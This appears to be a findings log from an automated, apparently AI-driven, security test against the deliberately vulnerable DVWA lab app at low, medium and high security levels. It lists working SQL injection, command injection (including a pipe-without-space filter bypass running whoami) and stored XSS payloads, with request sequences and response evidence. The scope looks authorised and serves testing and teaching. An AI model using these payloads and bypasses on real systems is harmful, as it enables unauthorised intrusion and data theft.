state.objective: Discover and behaviorally verify security vulnerabilities across permitted targets (http://dvwa and http://juiceshop:3000) within strict HTTP, LLM, and duration budgets.

endpoints.observation_evidence: [security=high] Security level confirmed high via /security.php (visible_text 'Security Level: high'). GET /vulnerabilities/sqli/ no longer shows an inline id form/input; instead only a link 'Click here to change your ID' pointing to session-input.php. The page renders results based on id value previously POSTed to session-input.php and stored server-side in $_SESSION. Underlying query appends LIMIT 1, so exploitation requires a trailing comment (e.g. 1' OR '1'='1' #) submitted via session-input.php before loading this page. status=pending_verification

[security=high] Security level confirmed high. Form fields unchanged from low/medium: ip(text), Submit(submit). At high security, blacklist is stricter than medium: '; ' (semicolon+space), '| ' (pipe+space), and '&&' are blacklisted, but a pipe WITHOUT trailing space (e.g. 127.0.0.1|whoami) is NOT blacklisted and should still allow command chaining. status=pending_verification

[security=high] Security level confirmed high. Form fields and maxlength unchanged from low: txtName maxlength=10, mtxMessage maxlength=50 (textarea), submit buttons btnSign='Sign Guestbook' and btnClear='Clear Guestbook'. Existing guestbook entries visible including a prior medium-level test canary 'medtest: window.xss_flag=1' rendered as plain text (no script tag visible in listing, consistent with htmlspecialchars encoding typically added at medium/high server-side input sanitization — needs verification whether txtName/mtxMessage still lack output encoding or whether stored script tags exe

Confirmed: POST security=high, seclev_submit=Submit, user_token=[REDACTED] prior GET> returned 302 redirect, and subsequent GET /security.php visible_text shows 'Security level is currently: high' and 'Security level set to high'. Session now operating at HIGH level for all three target vulnerability pages.

[security=medium] At medium level, /vulnerabilities/sqli/ form now submits via POST (method=POST, action=/vulnerabilities/sqli/) with id rendered as a <select> dropdown (options 1-5) instead of GET querystring text input used at low. Submit button name=Submit value=Submit. Per assignment spec, exploitation requires numeric boolean payloads (no quotes) since input is escaped server-side at medium, e.g. candidate TRUE=1 OR 1=1, FALSE=1 AND 1=2, submitted as POST body despite UI being a dropdown (raw HTTP POST can still send arbitrary id value bypassing the HTML select restriction).

[security=high] GET returned form with fields id(text) and Submit(submit) at /vulnerabilities/sqli/session-input.php. This form stores the id into session server-side; the subsequent GET /vulnerabilities/sqli/ reads id out-of-band from session and appends it to a query ending in LIMIT 1, requiring a trailing comment to break out (e.g. 1' OR '1'='1' #). status=pending_verification

findings.title: SQL Injection via unsanitized 'id' parameter in SQLi page (DVWA, security=low)
findings.response_evidence: [security=low] TRUE payload 1' OR '1'='1 returned 5 user records in <pre> blocks: (admin/admin), (Gordon/Brown), (Hack/Me), (Pablo/Picasso), (Bob/Smith). FALSE payload 1' AND '1'='2 returned zero records (page showed only 'User ID:' label with no pre blocks, no First name/Surname data). This differential behavior confirms the id parameter is concatenated unsanitized into the SQL query, enabling boolean-based SQL injection.

findings.title: OS Command Injection via unsanitized 'ip' parameter in Ping utility (DVWA, security=low)
findings.response_evidence: [security=low] Response pre block contained full ping output for 127.0.0.1 followed immediately by the line 'www-data' appended after the ping statistics, i.e.:\n'PING 127.0.0.1 ... rtt min/avg/max/mdev = 0.033/0.061/0.119/0.033 ms\\nwww-data'\nThis confirms the injected ';' shell metacharacter allowed arbitrary command execution (whoami) revealing the web server process identity www-data.

findings.title: Stored XSS via unsanitized 'mtxMessage' guestbook field (DVWA, security=low)
request_sequence: POST http://dvwa/vulnerabilities/xss_s/ form_data={txtName: 'tester', mtxMessage: '<script id=\"test_token\">window.xss_flag=1</script>', btnSign: 'Sign Guestbook'} (session=dvwa_admin)
findings.response_evidence: [security=low] POST response confirmed entry stored: visible_text shows new guestbook entry 'Name: tester Message:' (script content not rendered as visible text, consistent with it being injected as an executable script tag rather than plain text). Upon re-navigating to the guestbook page with Playwright (authenticated dvwa_admin session), the injected script executed client-side.
findings.browser_js_evidence: browser_eval_js("window.xss_flag") returned result: 1. browser_read_dom("#test_token") returned inner_text/inner_html_excerpt: "window.xss_flag=1", confirming the injected <script id=\"test_token\">window.xss_flag=1</script> payload was stored unsanitized and executed in the victim browser context upon page render.

findings.title: SQL Injection via numeric boolean payload in id POST field (DVWA medium)
request_sequence: POST http://dvwa/vulnerabilities/sqli/ form_data={id: '1 OR 1=1', Submit: 'Submit'} (session=dvwa_admin, security=medium)
POST http://dvwa/vulnerabilities/sqli/ form_data={id: '1 AND 1=2', Submit: 'Submit'} (session=dvwa_admin, security=medium)
findings.response_evidence: [security=medium] TRUE payload '1 OR 1=1' returned 5 seeded user records: (admin/admin), (Gordon/Brown), (Hack/Me), (Pablo/Picasso), (Bob/Smith). FALSE payload '1 AND 1=2' returned zero records (visible_text shows only 'User ID: 1 2 3 4 5' selector with no ID/First name/Surname rows). This confirms the id parameter is concatenated unescaped into the SQL query on the server despite the UI rendering a <select> dropdown; raw POST body with a numeric boolean injects directly. Page confirmed 'Security Level: medium' in both responses.

findings.title: OS Command Injection via pipe bypass in ip field (DVWA medium)
request_sequence: POST http://dvwa/vulnerabilities/exec/ form_data={ip: '127.0.0.1| whoami', Submit: 'Submit'} (session=dvwa_admin, security=medium)
findings.response_evidence: [security=medium] Payload '127.0.0.1| whoami' bypassed the medium-level blacklist (which blocks ';' and '&&' but not a bare pipe '|') and the response's <pre> output block contained exactly 'www-data', the web server process identity, in addition to the normal ping output being suppressed/replaced. Page confirmed 'Security Level: medium'. This proves the ip parameter is passed unsanitized to a shell command concatenated with the attacker-supplied pipe command.

findings.title: Stored XSS via mtxMessage field renders and executes injected script (DVWA medium)
request_sequence: POST http://dvwa/vulnerabilities/xss_s/ form_data={txtName: 'medtest', mtxMessage: '<script id="test_token">window.xss_flag=1</script>' (exactly 50 chars, matches maxlength), btnSign: 'Sign Guestbook'} (session=dvwa_admin, security=medium)
findings.response_evidence: [security=medium] Page confirmed 'Security Level: medium' at time of injection. After submission and reloading the guestbook page in an authenticated browser context, browser_eval_js('window.xss_flag') returned 1, and browser_read_dom('#test_token') located the live <script id="test_token"> element in the DOM with inner content 'window.xss_flag=1', proving the script tag was stored verbatim (not stripped/encoded) by the medium-level filter (which in this DVWA build only sanitizes txtName, not mtxMessage) and executed in the victim browser context on page load.
findings.browser_js_evidence: window.xss_flag === 1 (confirmed via browser_eval_js); DOM element #test_token inner_text/inner_html = "window.xss_flag=1"

findings.title: SQL Injection via out-of-band session id parameter (DVWA SQLi, high security)
request_sequence: POST http://dvwa/vulnerabilities/sqli/session-input.php  form_data={id: "1' OR '1'='1' #", Submit: Submit}  (dvwa_admin session)
GET http://dvwa/vulnerabilities/sqli/  (dvwa_admin session) -> renders TRUE condition result
POST http://dvwa/vulnerabilities/sqli/session-input.php  form_data={id: "1' AND '1'='2' #", Submit: Submit}  (dvwa_admin session)
GET http://dvwa/vulnerabilities/sqli/  (dvwa_admin session) -> renders FALSE condition result
findings.response_evidence: [security=high] Page footer confirms 'Security Level: high' for all requests. TRUE payload id=1' OR '1'='1' # stored via session-input.php, then GET /vulnerabilities/sqli/ rendered 5 distinct seeded records: (ID: 1' OR '1'='1' # / First name: admin / Surname: admin), (Gordon Brown), (Hack Me), (Pablo Picasso), (Bob Smith) — i.e. the entire users table was dumped, proving the injected OR condition and trailing comment (#) successfully bypassed the appended 'LIMIT 1' clause. FALSE control payload id=1' AND '1'='2' # (also bypassing LIMIT 1 via trailing comment) returned zero records — visible_text contained no 'First name:'/'Surname:' pre_blocks at all, only the static page chrome. This TRUE(5 rows)/FALSE(0 rows) differential confirms classic boolean-based SQL injection in the id value that DVWA's high-security session-input mechanism passes unsanitized into the backend query.

findings.title: OS Command Injection via pipe without trailing space (DVWA Command Injection, high security)
request_sequence: POST http://dvwa/vulnerabilities/exec/  form_data={ip: "127.0.0.1|whoami", Submit: Submit}  (dvwa_admin session)
findings.response_evidence: [security=high] Page footer confirms 'Security Level: high'. Payload ip=127.0.0.1|whoami (pipe with NO trailing space, bypassing the high-security blacklist which blocks '; ', '| ' (pipe+space), and '&&' but not an unspaced pipe) was submitted. Response pre_blocks contained the literal output 'www-data', confirming the whoami command executed server-side under the web process identity, i.e. successful OS command injection despite the hardened high-security input filter.
